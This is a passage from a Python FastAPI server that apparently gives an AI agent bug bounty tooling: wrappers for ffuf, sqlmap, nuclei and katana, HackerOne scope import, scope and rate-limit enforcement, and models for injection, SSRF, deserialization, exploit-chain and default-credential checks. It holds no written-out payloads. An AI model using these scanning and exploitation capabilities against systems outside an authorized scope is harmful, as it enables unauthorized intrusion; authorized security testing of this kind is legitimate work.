#!/usr/bin/env python3
"""MCP server using Katana, Nuclei, WhatWeb, and custom Python tooling.

Features:
- /mcp/set_scope         -> upload scope (json)
- /mcp/import_h1_scope   -> import scope from HackerOne program
- /mcp/search_h1_programs -> search HackerOne bug bounty programs
- /mcp/h1_program/{handle} -> get full HackerOne program details
- /mcp/run_ffuf          -> run ffuf on a target endpoint
- /mcp/run_sqlmap        -> run sqlmap on a target endpoint
- /mcp/run_nuclei        -> run nuclei recon templates
- /mcp/validate_poc_with_nuclei -> PoC validation with nuclei
- /mcp/run_cloud_recon   -> lightweight cloud recon
- /mcp/host_profile      -> aggregate recon data per host
- /mcp/prioritize_host   -> compute risk score per host
- /mcp/host_delta        -> delta between current/previous host_profile
- /mcp/run_js_miner      -> JS/config miner (background job)
- /mcp/run_reflector     -> parameter reflector tester (background job)
- /mcp/run_backup_hunt   -> backup/VCS ffuf hunt (background job)
- /mcp/job/{id}          -> query background job status/results
- /mcp/run_katana_nuclei -> Katana + Nuclei web recon wrapper
- /mcp/run_katana_auth   -> Dev-mode authenticated Katana via browser session
- /mcp/run_fingerprints  -> WhatWeb-style technology fingerprinting (local binary)
- /mcp/run_whatweb       -> WhatWeb fingerprinting via Docker with JSON output
- /mcp/run_api_recon     -> lightweight API surface probing
- /mcp/triage_nuclei_templates -> AI-driven template selection based on host_profile
- /mcp/run_targeted_nuclei     -> Run Nuclei with AI-selected templates
- /mcp/rag_search              -> RAG semantic search for similar vulnerabilities
- /mcp/rag_similar_vulns       -> Find similar vulns for a scanner finding
- /mcp/rag_stats               -> Get RAG knowledge base statistics
- /mcp/rag_search_by_type      -> Search by vulnerability type
- /mcp/rag_search_by_tech      -> Search by technology stack

Notes:
- ffuf, sqlmap, nuclei, katana, interactsh-client must be in PATH where used.
"""

import os
import sys
import json
import time
import subprocess
import threading
import re
from typing import List, Dict, Any, Optional, Tuple
from uuid import uuid4
from urllib.parse import urlparse, parse_qsl

import requests
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel

# Optional imports for distributed/local execution
try:
    from tools.local_executor import LocalExecutor, is_local_k8s_mode
    LOCAL_EXECUTOR_AVAILABLE = True
except ImportError:
    LOCAL_EXECUTOR_AVAILABLE = False

try:
    from tools.distributed_executor import DistributedExecutor, is_distributed_mode
    DISTRIBUTED_EXECUTOR_AVAILABLE = True
except ImportError:
    DISTRIBUTED_EXECUTOR_AVAILABLE = False

# ---------- helpers ----------

def normalize_target(t: str) -> str:
    """Strip scheme, path, and port - keep only the hostname."""
    if "://" in t:
        u = urlparse(t)
        host = (u.netloc or u.path).split("/")[0]
    else:
        host = t.split("/")[0]
    return host.lower().strip().rstrip(".")


def translate_url_for_docker(url: str) -> str:
    """Translate localhost URLs to Docker service names when MCP runs in Docker.
    
    Maps common lab ports to Docker service names:
    - localhost:5013 -> command_injection_lab:5000
    - localhost:5014 -> path_traversal_lab:5000
    - etc.
    
    Args:
        url: Original URL (may be localhost:PORT)
        
    Returns:
        Translated URL (Docker service name) or original URL if no mapping
    """
    # Lab port to service name mapping
    lab_port_map = {
        "5013": "command_injection_lab",
        "5014": "path_traversal_lab",
        "5015": "file_upload_lab",
        "5016": "csrf_lab",
        "5017": "nosql_injection_lab",
        "5018": "ldap_injection_lab",
        "5019": "mass_assignment_lab",
        "5020": "websocket_lab",
        "5022": "ssi_injection_lab",
        "5023": "crypto_weakness_lab",
        "5024": "parameter_pollution_lab",
        "5025": "dns_rebinding_lab",
        "5026": "cache_poisoning_lab",
        "5027": "random_generation_lab",
    }
    
    parsed = urlparse(url)
    host = parsed.netloc or parsed.path.split("/")[0]
    
    # Check if it's localhost with a mapped port
    if "localhost" in host.lower() or "127.0.0.1" in host:
        if ":" in host:
            port = host.split(":")[1]
            if port in lab_port_map:
                service_name = lab_port_map[port]
                # Replace host with Docker service name, keep port as 5000 (internal port)
                new_netloc = f"{service_name}:5000"
                new_url = f"{parsed.scheme}://{new_netloc}{parsed.path}"
                if parsed.query:
                    new_url += f"?{parsed.query}"
                if parsed.fragment:
                    new_url += f"#{parsed.fragment}"
                return new_url
    
    return url

# ---------- CONFIG ----------

H1_ALIAS = os.environ.get("H1_ALIAS", "h1yourusername@wearehackerone.com")
MAX_REQ_PER_SEC = float(os.environ.get("MAX_REQ_PER_SEC", "3.0"))

# Bug bounty rate limiting - conservative defaults
# Most bug bounty programs have strict rate limits (often 10-30 req/sec)
# We default to 10 req/sec to be safe, but can be overridden per program
# For lab testing (controlled environment), use higher limits
IS_LAB_ENV = os.environ.get("LAB_TESTING", "false").lower() == "true"
LAB_BB_RATE_LIMIT = float(os.environ.get("LAB_BB_RATE_LIMIT", "50.0"))  # Higher for lab
LAB_KATANA_RATE_LIMIT = int(os.environ.get("LAB_KATANA_RATE_LIMIT", "50"))  # Higher for lab
LAB_NUCLEI_RATE_LIMIT = int(os.environ.get("LAB_NUCLEI_RATE_LIMIT", "50"))  # Higher for lab

DEFAULT_BB_RATE_LIMIT = LAB_BB_RATE_LIMIT if IS_LAB_ENV else float(os.environ.get("DEFAULT_BB_RATE_LIMIT", "10.0"))  # req/sec
DEFAULT_KATANA_RATE_LIMIT = LAB_KATANA_RATE_LIMIT if IS_LAB_ENV else int(os.environ.get("DEFAULT_KATANA_RATE_LIMIT", "10"))  # req/sec
DEFAULT_NUCLEI_RATE_LIMIT = LAB_NUCLEI_RATE_LIMIT if IS_LAB_ENV else int(os.environ.get("DEFAULT_NUCLEI_RATE_LIMIT", "10"))  # req/sec

# Docker network for running external tool containers (katana, whatweb, etc.)
DOCKER_NETWORK = os.environ.get("DOCKER_NETWORK", "agentic-bugbounty_lab_network")

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# Multi-tenant isolation: use program_id if provided
PROGRAM_ID = os.environ.get("PROGRAM_ID", "default")
# Sanitize program_id for filesystem use
PROGRAM_ID = re.sub(r'[^a-zA-Z0-9_-]', '_', PROGRAM_ID.lower())[:50]

# Base output directory (without program_id)
BASE_OUTPUT_DIR = os.environ.get("OUTPUT_DIR", os.path.join(BASE_DIR, "output_scans"))
# Program-specific output directory
OUTPUT_DIR = os.path.join(BASE_OUTPUT_DIR, PROGRAM_ID)
os.makedirs(OUTPUT_DIR, exist_ok=True)

ARTIFACTS_DIR = os.path.join(OUTPUT_DIR, "artifacts")
os.makedirs(ARTIFACTS_DIR, exist_ok=True)

HOST_HISTORY_DIR = os.path.join(OUTPUT_DIR, "host_history")
os.makedirs(HOST_HISTORY_DIR, exist_ok=True)

# Curated nuclei recon template pack
_NUCLEI_RECON_RELATIVE: List[str] = [
    "technologies/",
    "ssl/",
    "http/exposed-panels/",
    "http/fingerprints/",
    "exposures/files/",
    "exposures/configs/",
]

NUCLEI_TEMPLATES_DIR = os.environ.get("NUCLEI_TEMPLATES_DIR", "").strip()
if NUCLEI_TEMPLATES_DIR:
    NUCLEI_RECON_TEMPLATES: List[str] = [
        os.path.join(NUCLEI_TEMPLATES_DIR, p) for p in _NUCLEI_RECON_RELATIVE
    ]
else:
    NUCLEI_RECON_TEMPLATES: List[str] = list(_NUCLEI_RECON_RELATIVE)

# ---------- Rate Limiting System ----------

# Global scope configuration for rate limits
_SCOPE_CONFIG: Optional[Dict[str, Any]] = None

def _get_rate_limit_from_scope() -> float:
    """Get rate limit from current scope configuration, with fallback to conservative default."""
    global _SCOPE_CONFIG
    
    if _SCOPE_CONFIG:
        rules = _SCOPE_CONFIG.get("rules", {})
        # Check for rate limit in rules
        rate_limit = rules.get("rate_limit")
        if rate_limit:
            # Parse rate limit string like "10 requests per second" or just a number
            if isinstance(rate_limit, (int, float)):
                return float(rate_limit)
            if isinstance(rate_limit, str):
                # Try to extract number from string
                import re
                match = re.search(r'(\d+(?:\.\d+)?)', rate_limit)
                if match:
                    return float(match.group(1))
        
        # Check for testing_rate_limit in policy
        policy = rules.get("policy", {})
        if policy:
            testing_rate_limit = policy.get("testing_rate_limit")
            if testing_rate_limit:
                import re
                match = re.search(r'(\d+(?:\.\d+)?)', str(testing_rate_limit))
                if match:
                    return float(match.group(1))
    
    # Conservative default for bug bounty programs
    return DEFAULT_BB_RATE_LIMIT

# Simple rate limiter (token bucket)
_last_time = 0.0
_allowance = MAX_REQ_PER_SEC

def rate_limit_wait():
    """Wait to respect rate limiting for API requests."""
    global _last_time, _allowance
    current = time.time()
    elapsed = current - _last_time
    _last_time = current
    _allowance += elapsed * MAX_REQ_PER_SEC
    if _allowance > MAX_REQ_PER_SEC:
        _allowance = MAX_REQ_PER_SEC
    if _allowance < 1.0:
        time.sleep((1.0 - _allowance) / MAX_REQ_PER_SEC)
        _allowance = 0.0
    else:
        _allowance -= 1.0

def get_katana_rate_limit() -> int:
    """Get rate limit for Katana crawler based on scope."""
    rate_limit = _get_rate_limit_from_scope()
    # Katana uses integer rate limits
    return max(1, int(rate_limit))  # At least 1 req/sec

def get_nuclei_rate_limit() -> int:
    """Get rate limit for Nuclei scanner based on scope."""
    rate_limit = _get_rate_limit_from_scope()
    # Nuclei uses integer rate limits
    return max(1, int(rate_limit))  # At least 1 req/sec

# ---------- Models & FastAPI app ----------

app = FastAPI(title="MCP Server (Katana/Nuclei, Recon)")

class BacChecksRequest(BaseModel):
    host: str
    url: Optional[str] = None
    # Auth support for authenticated BAC testing
    quick_login_url: Optional[str] = None  # e.g., "/login/alice" 
    login_url: Optional[str] = None  # e.g., "/login"
    credentials: Optional[Dict[str, str]] = None  # {"username": "alice", "password": "alice123"}
    auth_header: Optional[str] = None  # Pre-configured auth header value

class ScopeConfig(BaseModel):
    program_name: str
    primary_targets: List[str]
    secondary_targets: List[str]
    rules: Dict[str, Any] = {}  # Can include "rate_limit" (number or string like "10 req/sec") and "policy.testing_rate_limit"

class FfufRequest(BaseModel):
    target: str
    wordlist: str
    headers: Optional[Dict[str, str]] = None
    rate: Optional[int] = None

class SqlmapRequest(BaseModel):
    target: str
    data: Optional[str] = None
    headers: Optional[Dict[str, str]] = None

class SsrfChecksRequest(BaseModel):
    target: str  # full URL the application will fetch from
    param: Optional[str] = None  # query/body parameter carrying the URL, if applicable
    use_callback: Optional[bool] = True  # enable callback-based validation

class XxeChecksRequest(BaseModel):
    target: str  # full URL that accepts XML
    use_callback: Optional[bool] = True  # enable callback-based validation

class BusinessLogicChecksRequest(BaseModel):
    target: str  # target URL or host
    auth_context: Optional[Dict[str, Any]] = None  # optional auth context (cookies, headers)

class ExploitChainRequest(BaseModel):
    findings: List[Dict[str, Any]]  # list of findings to build chain from
    auth_context: Optional[Dict[str, Any]] = None  # optional auth context

class OAuthChecksRequest(BaseModel):
    host: str  # target host
    oauth_endpoints: Optional[List[str]] = None  # optional list of OAuth endpoints to test

class RaceChecksRequest(BaseModel):
    host: str  # target host
    url: Optional[str] = None  # optional specific URL to test
    num_requests: Optional[int] = 10  # number of parallel requests

class DeduplicateFindingsRequest(BaseModel):
    findings: List[Dict[str, Any]]  # list of findings to deduplicate
    use_semantic: Optional[bool] = True  # use semantic similarity

class SmugglingChecksRequest(BaseModel):
    host: str  # target host

class GraphQLSecurityRequest(BaseModel):
    endpoint: str  # GraphQL endpoint URL

class SstiChecksRequest(BaseModel):
    target_url: str  # Target URL to test
    param: Optional[str] = "q"  # Parameter name to test
    callback_url: Optional[str] = None  # Optional callback URL for RCE validation

class DeserChecksRequest(BaseModel):
    target_url: str  # Target URL to test
    format_type: Optional[str] = "auto"  # Format to test (java, python, dotnet, yaml, auto)
    callback_url: Optional[str] = None  # Optional callback URL for RCE validation

class CommandInjectionRequest(BaseModel):
    target_url: str  # Target URL to test
    params: Optional[List[str]] = None  # Parameters to test (if None, will discover)
    use_callback: bool = True  # Whether to use callback for OOB validation

class PathTraversalRequest(BaseModel):
    target_url: str  # Target URL to test
    param: Optional[str] = None  # Parameter to test (if None, will discover)
    file_paths: Optional[List[str]] = None  # File paths to test
    use_callback: bool = True  # Whether to use callback for blind detection

class FileUploadRequest(BaseModel):
    target_url: str  # Target URL
    upload_endpoint: Optional[str] = None  # Specific upload endpoint (if None, will discover)
    use_callback: bool = True  # Whether to use callback for execution validation

class CsrfChecksRequest(BaseModel):
    host: str  # Target host
    endpoints: Optional[List[Dict[str, Any]]] = None  # Optional endpoints to test
    auth_context: Optional[Dict[str, Any]] = None  # Optional authentication context

class SecretExposureRequest(BaseModel):
    host: str  # Target host
    scan_js: bool = True  # Whether to scan JavaScript files
    scan_responses: bool = True  # Whether to scan HTTP responses
    validate_secrets: bool = True  # Whether to validate found secrets

class NoSqlInjectionRequest(BaseModel):
    target_url: str  # Target URL
    param: Optional[str] = None  # Parameter to test
    db_type: Optional[str] = "auto"  # Database type (mongodb, couchdb, auto)
    use_callback: bool = True  # Whether to use callback

class LdapInjectionRequest(BaseModel):
    target_url: str  # Target URL
    param: Optional[str] = None  # Parameter to test
    endpoint_type: Optional[str] = "auth"  # Endpoint type (auth, search)

class MassAssignmentRequest(BaseModel):
    target_url: str  # Target URL
    endpoint: str  # API endpoint
    object_schema: Optional[Dict[str, Any]] = None  # Optional object schema

class WebSocketChecksRequest(BaseModel):
    endpoint: str  # WebSocket endpoint URL
    origin: Optional[str] = None  # Origin header value
    subprotocols: Optional[List[str]] = None  # Subprotocols to test

class SsiInjectionRequest(BaseModel):
    target_url: str  # Target URL
    param: Optional[str] = None  # Parameter to test
    use_callback: bool = True  # Whether to use callback

class CryptoChecksRequest(BaseModel):
    target_url: str  # Target URL
    tokens: Optional[List[str]] = None  # Optional tokens to analyze
    cookies: Optional[Dict[str, str]] = None  # Optional cookies to analyze

class ParameterPollutionRequest(BaseModel):
    target_url: str  # Target URL
    params: Optional[Dict[str, str]] = None  # Parameters to test

class DnsRebindingRequest(BaseModel):
    target_url: str  # Target URL
    internal_target: Optional[str] = "127.0.0.1"  # Internal target to test

class CachePoisoningRequest(BaseModel):
    target_url: str  # Target URL
    cache_headers: Optional[Dict[str, str]] = None  # Optional cache headers

class RandomGenerationRequest(BaseModel):
    target_url: str  # Target URL
    tokens: Optional[List[str]] = None  # Optional tokens to analyze
    auth_context: Optional[Dict[str, Any]] = None  # Optional authentication context

class BrowserPOCValidationRequest(BaseModel):
    finding: Dict[str, Any]  # Finding dict with URL, payload, type
    devtools_url: Optional[str] = None  # Chrome DevTools WebSocket URL (auto-detect if None)
    devtools_port: int = 9222  # Port for auto-detection
    wait_timeout: int = 5  # Seconds to wait for page load

class BrowserPOCValidationResult(BaseModel):
    validated: bool
    screenshot_path: Optional[str] = None
    console_logs: List[Dict[str, Any]] = []
    visual_indicators: List[str] = []
    page_content: Optional[str] = None
    error: Optional[str] = None

class NucleiRequest(BaseModel):
    target: str
    templates: Optional[List[str]] = None
    severity: Optional[List[str]] = None
    tags: Optional[List[str]] = None
    mode: Optional[str] = "recon"

class NucleiValidationRequest(BaseModel):
    target: str
    templates: List[str]
    severity: Optional[List[str]] = None
    tags: Optional[List[str]] = None

class AuthConfig(BaseModel):
    host: str
    type: str = "header"
    headers: Dict[str, str]

class CloudReconRequest(BaseModel):
    host: str

class CloudChecksRequest(BaseModel):
    target: str  # target URL or SSRF endpoint
    metadata_response: Optional[str] = None  # optional metadata response if already obtained

class KatanaNucleiRequest(BaseModel):
    target: str  # full URL
    output_name: Optional[str] = None
    mode: Optional[str] = "recon"  # recon (fast), auth (auth-focused dirs), targeted (tag-based, fastest), full (all templates)

class KatanaNucleiResult(BaseModel):
    target: str
    katana_count: int
    findings_file: str
    findings_count: int


class KatanaAuthRequest(BaseModel):
    target: str  # full URL of authenticated app (e.g. https://example.com)
    session_ws_url: Optional[str] = None  # DevTools WebSocket URL (dev mode)
    output_name: Optional[str] = None


class KatanaAuthResult(BaseModel):
    target: str
    output_file: str
    auth_katana_count: int


class FingerprintRequest(BaseModel):
    target: str  # full URL


class FingerprintResult(BaseModel):
    target: str
    output_file: str
    technologies: List[str]

class ApiReconRequest(BaseModel):
    host: str

class ApiReconResult(BaseModel):
    host: str
    endpoints_count: int
    findings_file: str


# ---------- BAC/SSRF/Nuclei Validation Models ----------

class BacChecksResult(BaseModel):
    host: str
    meta: Dict[str, Any]


class SsrfChecksResult(BaseModel):
    target: str
    param: Optional[str]
    meta: Dict[str, Any]

class XxeChecksResult(BaseModel):
    target: str
    meta: Dict[str, Any]
    results: Dict[str, Any]

class BusinessLogicChecksResult(BaseModel):
    target: str
    meta: Dict[str, Any]
    results: Dict[str, Any]

class ExploitChainResult(BaseModel):
    success: bool
    chain_name: Optional[str]
    steps_executed: int
    final_impact: Optional[Dict[str, Any]]
    exploit_code: Optional[str]
    evidence: List[Dict[str, Any]]

class CloudChecksResult(BaseModel):
    target: str
    meta: Dict[str, Any]
    results: Dict[str, Any]

class OAuthChecksResult(BaseModel):
    host: str
    findings_file: str
    vulnerable_count: int
    meta: Dict[str, Any]

class RaceChecksResult(BaseModel):
    host: str
    findings_file: str
    vulnerable_count: int
    meta: Dict[str, Any]

class DeduplicateFindingsResult(BaseModel):
    original_count: int
    deduplicated_count: int
    duplicates_removed: int
    deduplicated_findings: List[Dict[str, Any]]
    correlation_graph: Optional[Dict[str, Any]] = None

class SmugglingChecksResult(BaseModel):
    host: str
    findings_file: str
    vulnerable: bool
    meta: Dict[str, Any]

class GraphQLSecurityResult(BaseModel):
    endpoint: str
    findings_file: str
    vulnerable: bool
    meta: Dict[str, Any]

class SstiChecksResult(BaseModel):
    target_url: str
    findings_file: str
    vulnerable: bool
    template_engine: Optional[str] = None
    meta: Dict[str, Any]

class DeserChecksResult(BaseModel):
    target_url: str
    findings_file: str
    vulnerable: bool
    format_type: Optional[str] = None
    meta: Dict[str, Any]

class CommandInjectionResult(BaseModel):
    target_url: str
    findings_file: str
    vulnerable: bool
    injection_point: Optional[str] = None
    rce_confirmed: bool = False
    findings: Optional[List[Dict[str, Any]]] = []  # Include findings in response for orchestrator
    meta: Dict[str, Any]

class PathTraversalResult(BaseModel):
    target_url: str
    findings_file: str
    vulnerable: bool
    inclusion_type: Optional[str] = None  # lfi, rfi
    files_read: List[str] = []
    meta: Dict[str, Any]

class FileUploadResult(BaseModel):
    target_url: str
    findings_file: str
    vulnerable: bool
    bypass_methods: List[str] = []
    uploaded_files: List[Dict[str, Any]] = []
    rce_confirmed: bool = False
    meta: Dict[str, Any]

class CsrfChecksResult(BaseModel):
    host: str
    findings_file: str
    vulnerable_endpoints: List[Dict[str, Any]] = []
    poc_html: List[Dict[str, Any]] = []
    meta: Dict[str, Any]

class SecretExposureResult(BaseModel):
    host: str
    findings_file: str
    secrets_found: List[Dict[str, Any]] = []
    validated_secrets: List[Dict[str, Any]] = []
    severity: str = "low"
    meta: Dict[str, Any]

class NoSqlInjectionResult(BaseModel):
    target_url: str
    findings_file: str
    vulnerable: bool
    db_type: Optional[str] = None
    injection_method: Optional[str] = None
    meta: Dict[str, Any]

class LdapInjectionResult(BaseModel):
    target_url: str
    findings_file: str
    vulnerable: bool
    injection_method: Optional[str] = None
    auth_bypass: bool = False
    meta: Dict[str, Any]

class MassAssignmentResult(BaseModel):
    target_url: str
    findings_file: str
    vulnerable: bool
    manipulated_fields: List[str] = []
    privilege_escalation: bool = False
    meta: Dict[str, Any]

class WebSocketChecksResult(BaseModel):
    endpoint: str
    findings_file: str
    vulnerable: bool
    issues: List[str] = []
    meta: Dict[str, Any]

class SsiInjectionResult(BaseModel):
    target_url: str
    findings_file: str
    vulnerable: bool
    injection_method: Optional[str] = None
    rce_confirmed: bool = False
    meta: Dict[str, Any]

class CryptoChecksResult(BaseModel):
    target_url: str
    findings_file: str
    weak_algorithms: List[str] = []
    predictable_tokens: List[Dict[str, Any]] = []
    meta: Dict[str, Any]

class ParameterPollutionResult(BaseModel):
    target_url: str
    findings_file: str
    vulnerable: bool
    pollution_method: Optional[str] = None
    meta: Dict[str, Any]

class DnsRebindingResult(BaseModel):
    target_url: str
    findings_file: str
    vulnerable: bool
    internal_access: bool = False
    meta: Dict[str, Any]

class CachePoisoningResult(BaseModel):
    target_url: str
    findings_file: str
    vulnerable: bool
    poisoning_method: Optional[str] = None
    meta: Dict[str, Any]

class RandomGenerationResult(BaseModel):
    target_url: str
    findings_file: str
    predictable: bool = False
    token_type: Optional[str] = None
    meta: Dict[str, Any]


class NucleiScanResult(BaseModel):
    target: str
    findings_count: int
    findings_file: str
    mode: str
    templates_used: List[str]


# ---------- JWT/Auth Check Models ----------

class JwtChecksRequest(BaseModel):
    target: str  # Base URL of the target
    login_url: Optional[str] = "/login"  # Login endpoint
    credentials: Optional[Dict[str, str]] = None  # {"username": "user", "password": "pass"}
    quick_login_url: Optional[str] = None  # Quick login URL like "/login/alice"
    jwt_token: Optional[str] = None  # Pre-existing JWT to test


class JwtChecksResult(BaseModel):
    target: str
    meta: Dict[str, Any]


class AuthChecksRequest(BaseModel):
    target: str  # Base URL of the target
    login_url: Optional[str] = "/login"  # Login endpoint
    default_creds_list: Optional[List[Dict[str, str]]] = None  # Custom default creds to try


class AuthChecksResult(BaseModel):
    target: str
    meta: Dict[str, Any]


class NucleiTriageRequest(BaseModel):
    host: str
    use_llm: bool = True  # Whether to use LLM for intelligent selection


class NucleiTriageResult(BaseModel):
    host: str
    mode: str  # "recon" or "targeted"
    templates: List[str]
    tags: List[str]
    exclude_tags: List[str]
    severity_filter: List[str]
    reasoning: str


class TargetedNucleiRequest(BaseModel):
    target: str  # Full URL to scan
    templates: List[str]  # Template paths/directories to use
    tags: Optional[List[str]] = None  # Optional tags to filter
    exclude_tags: Optional[List[str]] = None  # Tags to exclude
    severity: Optional[List[str]] = None  # Severity filter


class TargetedNucleiResult(BaseModel):
    target: str
    findings_count: int
    findings_file: str
    templates_used: int


class SecurityHeadersRequest(BaseModel):
    url: str  # Full URL to check


class SecurityHeadersIssue(BaseModel):
    header: str
    severity: str  # "high", "medium", "low"
    issue: str  # Description of the issue
    recommendation: str


class SecurityHeadersResult(BaseModel):
    url: str
    headers: Dict[str, str]
    issues: List[SecurityHeadersIssue]
    score: int  # 0-100 security score


class OpenRedirectRequest(BaseModel):
    url: str  # Full URL with redirect parameter
    params: Optional[List[str]] = None  # Optional list of param names to test


class OpenRedirectResult(BaseModel):
    url: str
    vulnerable: bool
    vulnerable_params: List[Dict[str, Any]]  # [{"param": "...", "payload": "...", "redirects_to": "..."}]


class TakeoverChecksRequest(BaseModel):
    domain: str  # Base domain (e.g., "example.com")
    subdomains: Optional[List[str]] = None  # Optional pre-discovered subdomains


class TakeoverVulnerability(BaseModel):
    subdomain: str
    service: str  # "github", "heroku", "s3", etc.
    claimable: bool
    cname: Optional[str] = None
    evidence: str


class TakeoverChecksResult(BaseModel):
    domain: str
    vulnerable_subdomains: List[TakeoverVulnerability]
    checked_count: int


class WhatWebRequest(BaseModel):
    target: str  # Full URL to fingerprint


class WhatWebResult(BaseModel):
    target: str
    output_file: str
    technologies: List[str]
    raw_plugins: Dict[str, Any]


# ---------- HackerOne Import Models ----------

class H1ImportRequest(BaseModel):
    handle: str  # HackerOne program handle (e.g., "23andme_bbp")
    url: Optional[str] = None  # Alternative: provide full URL
    include_out_of_scope: bool = False  # Include out-of-scope assets in response
    auto_set_scope: bool = True  # Automatically set as active scope


class H1ImportResult(BaseModel):
    program_name: str
    program_handle: str
    program_url: str
    in_scope_count: int
    out_of_scope_count: int
    primary_targets: List[str]
    secondary_targets: List[str]
    bounty_ranges: Dict[str, Any]
    scope_file: str
    scope_set: bool


class H1SearchRequest(BaseModel):
    query: str
    limit: int = 20
    bounties_only: bool = True


class H1SearchResult(BaseModel):
    handle: str
    name: str
    offers_bounties: bool
    state: Optional[str] = None


# ---------- RAG Models ----------

class RAGSearchRequest(BaseModel):
    query: str
    top_k: int = 5
    min_similarity: float = 0.3
    vuln_type: Optional[str] = None
    severity: Optional[str] = None
    technologies: Optional[List[str]] = None


class RAGSearchResult(BaseModel):
    report_id: str
    title: str
    vuln_type: str
    severity: str
    cwe: str
    target_technology: List[str]
    attack_vector: str
    payload: str
    impact: str
    source_url: str
    similarity: float


class RAGSearchResponse(BaseModel):
    query: str
    results: List[RAGSearchResult]
    total_results: int


class RAGSimilarVulnsRequest(BaseModel):
    finding: Dict[str, Any]  # Scanner finding to find similar vulns for
    host_profile: Optional[Dict[str, Any]] = None  # Optional host profile for context
    top_k: int = 5
    min_similarity: float = 0.4


class RAGSimilarVulnsResponse(BaseModel):
    results: List[RAGSearchResult]
    context_string: str  # Pre-formatted context for LLM injection
    total_results: int


class RAGStatsResponse(BaseModel):
    total_reports: int
    vuln_types: Dict[str, int]
    severities: Dict[str, int]


class RAGSearchByTypeRequest(BaseModel):
    vuln_type: str  # e.g., "xss", "ssrf", "sqli"
    top_k: int = 10


class RAGSearchByTechRequest(BaseModel):
    technologies: List[str]  # e.g., ["graphql", "nodejs"]
    top_k: int = 10


# ---------- in-memory stores ----------

SCOPE: Optional[ScopeConfig] = None
JOB_STORE: Dict[str, Dict[str, Any]] = {}
AUTH_CONFIGS: Dict[str, AuthConfig] = {}

# ---------- scope helpers ----------

def _scope_allowed_host(host_or_url: str) -> bool:
    """Check if host is in scope using enhanced matching (wildcards, paths)."""
    if SCOPE is None:
        return False
    
    try:
        from tools.scope_validator import is_url_in_scope
        
        # Convert SCOPE to dict format for scope_validator
        scope_dict = {
            "primary_targets": SCOPE.primary_targets,
            "secondary_targets": SCOPE.secondary_targets,
            "in_scope": _SCOPE_CONFIG.get("in_scope", []) if _SCOPE_CONFIG else [],
        }
        
        # Check original URL
        is_in_scope, _ = is_url_in_scope(host_or_url, scope_dict)
        if is_in_scope:
            return True
        
        # Also check translated Docker service name (for lab testing)
        # This allows localhost:5013 to match command_injection_lab:5000 in scope
        translated_url = translate_url_for_docker(host_or_url)
        if translated_url != host_or_url:
            is_in_scope_translated, _ = is_url_in_scope(translated_url, scope_dict)
            if is_in_scope_translated:
                return True
        
        return False
    except ImportError:
        # Fallback to basic matching if scope_validator not available
        host = normalize_target(host_or_url)
        allowed = {normalize_target(x) for x in (SCOPE.primary_targets + SCOPE.secondary_targets)}
        return host in allowed

def _enforce_scope(host_or_url: str) -> str:
    """Enforce scope checking with enhanced wildcard/path matching."""
    if not _scope_allowed_host(host_or_url):
        raise HTTPException(status_code=400, detail=f"Target {normalize_target(host_or_url)} not in scope.")
    return normalize_target(host_or_url)


@app.post("/mcp/set_scope")
def set_scope(cfg: ScopeConfig):
    """Upload scope configuration used by _enforce_scope.

    Stores the ScopeConfig in-memory so later calls to endpoints that
    enforce scope (e.g., js_miner, backup_hunt, katana, auth, etc.)
    will accept only hosts listed in primary_targets/secondary_targets.
    
    Enhanced scope matching supports:
    - Wildcard domains (*.example.com)
    - Path-based restrictions
    - Subdomain matching
    
    Also stores rate limit configuration from scope rules.
    """

    global SCOPE, _SCOPE_CONFIG
    SCOPE = cfg
    # Store config for rate limit reading
    _SCOPE_CONFIG = cfg.dict() if hasattr(cfg, 'dict') else cfg.model_dump() if hasattr(cfg, 'model_dump') else {}
    
    # Log rate limit being used
    rate_limit = _get_rate_limit_from_scope()
    
    # Get scope summary if scope_validator is available
    try:
        from tools.scope_validator import get_scope_summary
        scope_dict = {
            "primary_targets": cfg.primary_targets,
            "secondary_targets": cfg.secondary_targets,
            "in_scope": _SCOPE_CONFIG.get("in_scope", []),
        }
        summary = get_scope_summary(scope_dict)
        print(f"[SCOPE] Rate limit: {rate_limit} req/sec, Targets: {summary.get('total_targets', 0)}, Wildcards: {summary.get('wildcard_domains_count', 0)}", file=sys.stderr)
    except ImportError:
        print(f"[SCOPE] Rate limit set to {rate_limit} req/sec (from scope rules or default)", file=sys.stderr)
    
    return {"status": "ok", "program_name": cfg.program_name, "rate_limit": rate_limit}


@app.post("/mcp/import_h1_scope", response_model=H1ImportResult)
def import_h1_scope(req: H1ImportRequest):
    """
    Import a bug bounty program scope from HackerOne.
    
    This endpoint:
    1. Fetches program info from HackerOne (via GraphQL or page scraping)
    2. Extracts in-scope and out-of-scope assets
    3. Generates a scope.json compatible with the agentic runner
    4. Optionally sets it as the active scope for scanning
    
    Example:
        POST /mcp/import_h1_scope
        {"handle": "23andme_bbp", "auto_set_scope": true}
    """
    from urllib.parse import urlparse
    
    # Determine handle from input
    handle = req.handle
    if req.url:
        # Extract handle from URL
        parsed = urlparse(req.url)
        path = parsed.path.strip("/")
        if path.startswith("programs/"):
            handle = path.split("/")[1]
        else:
            handle = path.split("/")[0].split("?")[0]
    
    if not handle:
        raise HTTPException(status_code=400, detail="No program handle provided")
    
    # Import the H1 client (lazy import to avoid startup failures)
    try:
        from tools.h1_client import H1Client, H1NotFoundError, H1ClientError
    except ImportError as e:
        raise HTTPException(
            status_code=500,
            detail=f"H1 client not available: {e}. Ensure tools/h1_client.py exists.",
        )
    
    print(f"[H1] Importing program: {handle}", file=sys.stderr)
    
    try:
        client = H1Client()
        program = client.fetch_program(handle)
    except H1NotFoundError:
        raise HTTPException(status_code=404, detail=f"Program not found: {handle}")
    except H1ClientError as e:
        raise HTTPException(status_code=502, detail=f"Error fetching from HackerOne: {e}")
    
    # Generate scope.json
    scope_data = program.to_scope_json(include_out_of_scope=req.include_out_of_scope)
    
    # Save to file
    scopes_dir = os.path.join(OUTPUT_DIR, "scopes")
    os.makedirs(scopes_dir, exist_ok=True)
    scope_file = os.path.join(scopes_dir, f"{handle}.json")
    
    with open(scope_file, "w", encoding="utf-8") as f:
        json.dump(scope_data, f, indent=2)
    
    print(f"[H1] Saved scope to: {scope_file}", file=sys.stderr)
    
    # Auto-generate program config file
    try:
        from tools.program_config_generator import generate_program_config
        config_file = generate_program_config(handle, program, scope_data)
        print(f"[H1] Generated program config: {config_file}", file=sys.stderr)
    except Exception as e:
        print(f"[H1] Warning: Failed to generate program config: {e}", file=sys.stderr)
    
    # Optionally set as active scope
    scope_set = False
    if req.auto_set_scope:
        global SCOPE
